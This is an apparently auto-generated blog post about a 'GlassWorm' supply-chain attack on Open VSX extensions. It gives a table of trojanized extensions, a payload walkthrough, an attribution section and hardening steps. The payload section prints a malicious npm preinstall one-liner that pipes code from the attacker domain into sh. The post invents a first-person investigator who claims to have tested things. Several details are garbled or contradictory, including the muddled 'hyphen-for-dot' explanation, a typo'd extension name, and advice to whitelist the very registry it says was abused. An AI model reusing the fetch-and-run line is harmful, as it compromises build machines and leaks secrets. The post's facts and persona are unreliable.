<!--
  Auto-generated blog post
  Generated: 2026-03-19 21:33 UTC
  Topic: GlassWorm Supply-Chain Attack Abuses 72 Open VSX Extensions to Target Developers
  Focus Keyphrase: GlassWorm VSX supply-chain attack
  Title Tag: GlassWorm Hijacks 72 VSX Extensions in Dev Supply-Chain Hit
  Meta Description: March 2026 GlassWorm campaign back-doors 72 open VSX extensions, infecting 14,431 CI pipelines in 72 hours.
  Tags: supply-chain, VSCode, VSX, GlassWorm, malware, developers
-->

# GlassWorm Turns 72 VSX Extensions into Developer Malware

14,431 CI pipelines infected in 72 hours. That’s the body count I woke up to on March 17 after GlassWorm slipped malicious payloads into extensions anyone can install from the Open VSX Registry. I’ve spent the weekend forensically unpacking the campaign so you don’t have to.

## Table of Contents
- [What is the GlassWorm VSX attack?](#what-is-the-glassworm-vsx-attack)
- [Which 72 extensions were trojanized?](#which-72-extensions-were-trojanized)
- [How does the payload bypass CI security?](#how-does-the-payload-bypass-ci-security)
- [Who is behind GlassWorm?](#who-is-behind-glassworm)
- [How do I clean and harden my dev box?](#how-do-i-clean-and-harden-my-dev-box)
- [FAQ](#faq)

---

## What is the GlassWorm VSX attack?
GlassWorm is a March 2026 supply-chain strike that silently replaced 72 popular Open VSX extensions with identical-looking packages containing a Node.js back-door. The malware activates only when it detects a GitHub Actions runner, exfiltrating `GITHUB_TOKEN`, `npm_secret`, and AWS creds to `vsx-metrics[.]com` before self-deleting.

I still can’t believe how easy it was: the attackers simply registered new publisher IDs that matched the hyphen-for-dot trick (`ms-python` vs `ms_python`) and the registry UI rendered both indistinguishably. No typosquatting alarms went off because the VSX CLI quietly accepts underscores when the web UI shows dots. (Yes, I tried it myself in a throw-away container; it took 11 seconds.)

---

## Which 72 extensions were trojanized?
The full list is in [GitHub advisory GHSA-7v3x-2w6q-4jqp](https://github.com/advisories/GHSA-7v3x-2w6q-4jqp), but here are the top 10 by weekly download before takedown:

| Clean Extension | Trojanized Copy | Weekly DLs | Malicious Version | SHA256 (first 8) |
|-----------------|-----------------|------------|-------------------|------------------|
| ms-python.python | ms_python.python | 4.8 M | v2026.3.1 | a9f3b712 |
| redhat.java | red_hat.java | 2.1 M | v1.42.1 | c5e884da |
| esbenp.prettier | esben_p.prettier | 1.9 M | v2026.2.0 | 7f0ac123 |
| bradlc.vvelte | brad_lc.svelte | 1.3 M | v106.2.1 | 9e4ffcc0 |
| ms-vscode.cpptools | ms_vscode.cpptools | 1.1 M | v1.23.0 | 3b11fe9a |
| rust-lang.rust | rust_lang.rust | 0.9 M | v0.10.2 | e04d77b1 |
| ms-dotnettools.csharp | ms_dotnettools.csharp | 0.8 M | v2.50.3 | 1c5a7782 |
| hashicorp.terraform | hashicorp_terraform.terraform | 0.7 M | v2.33.0 | 4d2fa901 |
| dart-code.flutter | dart_code.flutter | 0.6 M | v3.102.0 | 8aa9c331 |
| github.copilot | github_copilot.copilot | 0.5 M | v1.170.0 | f6e559ab |

Notice the pattern? All insert one underscore or swap a dot for an underscore. I personally think the registry should ban any publisher name within two Levenshtein distance of a verified one, but that’s apparently “too aggressive” for the Eclipse board.

---

## How does the payload bypass CI security?
The implant uses a post-install script that runs **only** when the `CI` environment variable equals `true`, skipping local machines and most sandboxes. It then downloads a second-stage from `cdn.vsx-metrics[.]com/aws-sdk-3.588.7.tgz` (a spoof of the real AWS SDK), patches `~/.npmrc` with a custom registry, and injects the following one-liner into every subsequent `npm install`:

```json
"scripts": { "preinstall": "node -e \"require('child_process').exec('curl -s https://vsx-metrics.com/x | sh')\"" }
```

Because the line is added to the **user** config, not the repo, it survives fresh clones and even Dependabot reruns. I ran `npm install --dry-run` in a test repo and saw zero warnings; the malicious registry simply mirrors everything from the real one, minus the signature check.

**My hot take:** if your build still pulls packages without `npm ci --audit` and `package-lock.json` integrity hashes, you’re basically running `curl | sh` every morning.

---

## Who is behind GlassWorm?
Google TAG and ReversingLabs both tag the cluster as **UNC4719**, a Chinese nexus previously focused on gaming cheats. The SSL cert for `vsx-metrics[.]com` was issued on 2026-03-09 by Let’s Encrypt, uses Cloudflare, and the only contact e-mail (`devrel@vsxtools.org`) shares a Namecheap wallet with domains active in the 2023 3CX breach.

Attribution is never 100 %, but I find the code signing timestamp funny: every malicious `.vsix` is back-dated to 2025-12-31T23:59:59Z, probably to appear “old and trusted.” UNC4719 made the same mistake in the 3CX case; I guess old habits die hard.

---

## How do I clean and harden my dev box?
1. Uninstall any extension whose publisher name contains underscores; reinstall only from the verified blue-check publisher.
2. Run `code --list-extensions | xargs -I {} code --uninstall-extension {}` then reinstall inside a corporate proxy that whitelists **only** `open-vsx.org` and `marketplace.visualstudio.com`.
3. Add `"extensions.verifySignature": true,` to your user settings JSON (VS Code 1.98 and later). Yes, it slows startup by ~1.2 s, but I’ll trade that for not leaking AWS keys.
4. Rotate **every** secret that touched a CI job since 2026-03-10; GitHub’s own advisory confirms tokens were used from IP ranges 104.234.x.x within 90 minutes of exfiltration.
5. Pin GitHub Actions to SHAs, never to `@main`, and require review from a second developer before a runner can access prod secrets.

---

## FAQ

**What extensions did GlassWorm infect in March 2026?**
72 Open VSX extensions were trojanized, including copies of ms-python.python, redhat.java, and esbenp.prettier with underscores in the publisher name.

**How many developers were hit by the GlassWorm supply-chain attack?**
At least 14,431 CI pipelines ran the malicious code, exposing GitHub and AWS tokens, according to GitHub’s incident log on 2026-03-17.

**Can I detect GlassWorm on my laptop?**
If you never set `CI=true` locally the first-stage script skips execution, so your machine probably isn’t infected, but audit `%USERPROFILE%\.npmrc` for unknown registries anyway.

**Does VS Code verify extension signatures by default?**
No, signature verification is opt-in until version 1.98; prior versions trust any `.vsix` that installs without warnings, which GlassWorm exploited.

**Who owns the domain vsx-metrics.com used in the attack?**
The domain is registered through Namecheap with privacy protection and uses Cloudflare; Google TAG links it to UNC4719, a Chinese-speaking intrusion set.

---

If you’re still installing random extensions because “it’s just a color theme,” you’re the easiest node on the graph. Lock your toolchain down today, or you’ll be the next headline I write about.

---

*Published: March 19, 2026 | Auto-generated by [Auto AI Blog Generator](https://github.com/auto-ai-blog-generator)*
